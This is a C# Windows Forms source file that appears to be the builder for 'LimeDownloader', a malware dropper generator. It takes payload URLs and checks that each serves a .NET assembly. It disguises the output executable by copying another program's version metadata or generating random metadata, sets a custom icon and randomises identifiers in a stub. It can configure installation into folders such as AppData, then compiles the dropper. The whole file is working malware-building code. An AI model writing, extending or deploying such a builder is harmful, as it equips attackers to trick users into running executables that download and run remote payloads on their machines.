using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using System.Net;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Reflection;
using Microsoft.VisualBasic;
using LimeDownloader.Util;

namespace LimeDownloader
{
    public partial class Form1 : Form
    {
        private readonly Random random = new Random();
        private readonly List<string> urlList = new List<string>();
        private readonly RandomCharacters randomCharacters;
        private readonly RandomFileInfo randomFileInfo;

        public Form1()
        {
            this.randomCharacters = new RandomCharacters();
            this.randomFileInfo = new RandomFileInfo(randomCharacters);
            InitializeComponent();
            urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        }

        private readonly Dictionary<DownloadPayloadResult, string> DownloadPayloadResultDescriptions = new Dictionary<DownloadPayloadResult, string>()
        {
            { DownloadPayloadResult.None, "None"},
            { DownloadPayloadResult.InvalidAssembly, "Could not load assembly"},
            { DownloadPayloadResult.InvalidNETAssembly, "Invalid .NET Assembly"},
            { DownloadPayloadResult.InvalidURL, "Invalid URL"},
            { DownloadPayloadResult.Valid, "Valid"}
        };

        private async void btnAddLink_Click(object sender, EventArgs e)
        {
            var inputUrl = Interaction.InputBox("Add Direct Link", "Add URL", "https://dropmyb.in/");
            if (string.IsNullOrEmpty(inputUrl))
            {
                return;
            }

            if (!urlList.Contains(inputUrl))
            {
                var listViewItem = new ListViewItem();
                listViewItem.Text = inputUrl;
                listViewItem.SubItems.Add("Testing");
                urlListView.Items.Insert(0, listViewItem);
                var downloadStatus = await DownloadDataAsync(inputUrl);
                listViewItem.SubItems[1].Text = DownloadPayloadResultDescriptions[downloadStatus];
                urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                urlListView.AutoResizeColumn(1, ColumnHeaderAutoResizeStyle.ColumnContent);
                if (downloadStatus == DownloadPayloadResult.Valid)
                {
                    listViewItem.ForeColor = Color.Green;
                    urlList.Add(inputUrl);
                }
                else
                {
                    listViewItem.ForeColor = Color.Red;
                }
            }
        }

        private async Task<DownloadPayloadResult> DownloadDataAsync(string url)
        {
            var result = DownloadPayloadResult.None;
            result = await Task.Run(() =>
            {
                using (var webClient = new WebClient())
                {
                    try
                    {
                        var payloadBytes = webClient.DownloadData(url);
                        try
                        {
                            Assembly.ReflectionOnlyLoad(payloadBytes);
                        }
                        catch
                        {
                            return DownloadPayloadResult.InvalidAssembly;
                        }

                        return DownloadPayloadResult.Valid;
                    }
                    catch (WebException)
                    {
                        return DownloadPayloadResult.InvalidURL;
                    }
                    catch (BadImageFormatException)
                    {
                        return DownloadPayloadResult.InvalidNETAssembly;
                    }
                }
            });
            return result;
        }


        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (urlListView.SelectedItems.Count > 0)
            {
                foreach (ListViewItem url in urlListView.SelectedItems)
                {
                    urlList.Remove(url.Text);
                    url.Remove();
                }
            }
        }

        private void btnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtTitle.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademark.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    assemblyMajorVersion.Text = fileVersionInfo.FileMajorPart.ToString();
                    assemblyMinorVersion.Text = fileVersionInfo.FileMinorPart.ToString();
                    assemblyBuildPart.Text = fileVersionInfo.FileBuildPart.ToString();
                    assemblyPrivatePart.Text = fileVersionInfo.FilePrivatePart.ToString();
                }
            }
        }

        private void btnRandom_Click(object sender, EventArgs e)
        {
            var newInfo = randomFileInfo.getRandomFileInfo();
            txtTitle.Text = newInfo.Title;
            txtDescription.Text = newInfo.Description;
            txtProduct.Text = newInfo.Product;
            txtCompany.Text = newInfo.Company;
            txtCopyright.Text = newInfo.Copyright;
            txtTrademark.Text = newInfo.Trademark;
            assemblyMajorVersion.Text = newInfo.MajorVersion;
            assemblyMinorVersion.Text = newInfo.MinorVersion;
            assemblyBuildPart.Text = newInfo.BuildPart;
            assemblyPrivatePart.Text = newInfo.PrivatePart;
        }

        private void btnIconOpen_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    txtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }
            }
        }

        private void txtIcon_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtIcon.Text))
            {
                txtIcon.Text = string.Empty;
                pictureIcon.ImageLocation = string.Empty;
                pictureIcon.BorderStyle = BorderStyle.None;
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (urlListView.Items.Count == 0)
            {
                return;
            }

            if (urlList.Count == 0)
            {
                return;
            }

            try
            {
                using (var saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var stubSource = Properties.Resources.Stub;
                        stubSource = stubSource.Replace("\"$URL$\"", string.Join(", ", urlList.Select(x => $"\"{x}\"").ToList()));
                        stubSource = stubSource.Replace("Stubclass", randomCharacters.getRandomCharacters(random.Next(10, 20)));
                        stubSource = stubSource.Replace("LimeDownloader_Stubnamespace", randomCharacters.getRandomCharacters(random.Next(10, 20)));
                        stubSource = stubSource.Replace("%Title%", txtTitle.Text);
                        stubSource = stubSource.Replace("%Description%", txtDescription.Text);
                        stubSource = stubSource.Replace("%Product%", txtProduct.Text);
                        stubSource = stubSource.Replace("%Company%", txtCompany.Text);
                        stubSource = stubSource.Replace("%Copyright%", txtCopyright.Text);
                        stubSource = stubSource.Replace("%Trademark%", txtTrademark.Text);
                        stubSource = stubSource.Replace("%v1%", assemblyMajorVersion.Text);
                        stubSource = stubSource.Replace("%v2%", assemblyMinorVersion.Text);
                        stubSource = stubSource.Replace("%v3%", assemblyBuildPart.Text);
                        stubSource = stubSource.Replace("%v4%", assemblyPrivatePart.Text);
                        stubSource = stubSource.Replace("%Guid%", Guid.NewGuid().ToString());

                        if (chkEnableInstall.Checked)
                        {
                            if (string.IsNullOrWhiteSpace(txtPayloadName.Text))
                            {
                                return;
                            }
                            if (!txtPayloadName.Text.EndsWith(".exe"))
                            {
                                txtPayloadName.Text += ".exe";
                            }
                            stubSource = stubSource.Replace("#undef INS", "#define INS");
                            stubSource = stubSource.Replace("%EXE%", txtPayloadName.Text);
                            stubSource = stubSource.Replace("%DIR%", cbInstallFolder.Text);
                        }

                        var isOK = Compiler.CompileFromSource(stubSource, saveFileDialog.FileName, string.IsNullOrWhiteSpace(txtIcon.Text) ? null : txtIcon.Text);

                        if (isOK)
                        {
                            MessageBox.Show("Done!");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                labelBuild.Text = ex.Message;
            }
        }

        private void chkINS_CheckboxChanged(object sender, EventArgs e)
        {
            cbInstallFolder.Enabled = txtPayloadName.Enabled = chkEnableInstall.Checked;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            const string ApplicationDataFolder = "ApplicationData";
            foreach (var typeSpecialFolder in Enum.GetValues(typeof(Environment.SpecialFolder)))
            {
                cbInstallFolder.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == ApplicationDataFolder)
                {
                    cbInstallFolder.Text = ApplicationDataFolder;
                }
            }
        }
    }
}
